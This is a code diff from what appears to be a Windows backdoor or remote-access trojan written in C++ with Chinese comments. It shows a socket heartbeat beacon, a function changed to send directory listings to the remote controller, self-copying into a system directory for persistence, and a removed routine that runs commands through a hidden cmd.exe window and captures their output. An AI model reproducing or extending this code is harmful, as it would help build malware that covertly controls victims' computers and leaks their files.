@@ -118,7 +118,7 @@ bool TcharToChar(const TCHAR* tchar, char* _char)
 
 bool HeartBeat(SOCKET fd)
 {
-	char buf[20] = "Alive";
+	char buf[20] = "\nAlive\n";
 	encode(buf);
 	while (true)
 	{
@@ -281,27 +281,21 @@ void decode(char* pwd)
 	base32decode(pwd, strlen(pwd));
 }
 
-void GetFileName(char FileName[FileNameRow][FileNameCol], char* str)
+void GetFileName(SOCKET fd, char FileName[Row], char* str)
 {
-	int i = 0;
 	intptr_t Handle;
 	struct _finddata_t FileInfo;
 	string path(str);
 	Handle = _findfirst(path.append("\\*").c_str(), &FileInfo);
 	while (_findnext(Handle, &FileInfo) == 0)
 	{
-		strcpy(FileName[i], FileInfo.name);
-		i++;
+		strcpy(FileName, FileInfo.name);
+		cout << FileName << endl;
+		send(fd, FileName, Row, 0);
+		ZeroMemory(FileName, sizeof(FileName));
 	}
+	send(fd, FileName, Row, 0);
 	_findclose(Handle);
-	//加密
-	for (i = 0; i < FileNameCol; i++)
-	{
-		if (FileName[i][0] != 0)
-		{
-			encode(FileName[i]);
-		}
-	}
 }
 
 int ComputerStart(char* pathName)
@@ -369,57 +363,5 @@ int copySelf(char* path)
 	LPWSTR Path = CharToLPWSTR(path);
 	//将文件复制到系统目录
 	CopyFile(fileName, Path, FALSE);
-	return 0;
-}
-
-int cmd(char* cmdStr, char* message)
-{
-	DWORD readByte = 0;
-	char command[BUFSIZ * 2] = { 0 };
-	char buf[BUFSIZ * 2] = { 0 }; //缓冲区
-
-	HANDLE hRead, hWrite;
-	STARTUPINFO si;         // 启动配置信息
-	PROCESS_INFORMATION pi; // 进程信息
-	SECURITY_ATTRIBUTES sa; // 管道安全属性
-
-	// 配置管道安全属性
-	sa.nLength = sizeof(sa);
-	sa.bInheritHandle = TRUE;
-	sa.lpSecurityDescriptor = NULL;
-
-	// 创建匿名管道，管道句柄是可被继承的
-	if (!CreatePipe(&hRead, &hWrite, &sa, BUFSIZ * 2)) {
-		return 1;
-	}
-
-	// 配置 cmd 启动信息
-	ZeroMemory(&si, sizeof(si));
-	si.cb = sizeof(si); // 获取兼容大小
-	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW; // 标准输出等使用额外的
-	si.wShowWindow = SW_HIDE;               // 隐藏窗口启动
-	si.hStdOutput = si.hStdError = hWrite;  // 输出流和错误流指向管道写的一头
-
-	// 拼接 cmd 命令
-	sprintf(command, "cmd.exe /c %s", cmdStr);
-
-	// 创建子进程,运行命令,子进程是可继承的
-	if (!CreateProcess(NULL, (LPWSTR)command, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi))
-	{
-		CloseHandle(hRead);
-		CloseHandle(hWrite);
-		printf("error!");
-		return 1;
-	}
-	CloseHandle(hWrite);
-
-	//读取管道的read端,获得cmd输出
-	while (ReadFile(hRead, buf, BUFSIZ * 2, &readByte, NULL))
-	{
-		strcat(message, buf);
-		ZeroMemory(buf, BUFSIZ * 2);
-	}
-	CloseHandle(hRead);
-
 	return 0;
 }
